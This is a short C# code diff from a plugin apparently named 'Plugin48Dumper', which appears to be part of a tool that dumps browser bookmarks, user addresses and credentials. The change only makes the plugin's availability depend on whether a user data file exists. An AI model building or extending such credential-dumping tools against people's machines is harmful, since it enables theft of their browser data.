@@ -56,7 +56,7 @@ namespace Plugin48Dumper
             //dtHelp.Rows.Add("address", "Dump user's addresses.");
             dtHelp.Rows.Add("bookmark", "Dump browser bookmarks.");
 
-            Available = true;
+            Available = File.Exists(UserDataFile);
         }
 
         public class clsCredential
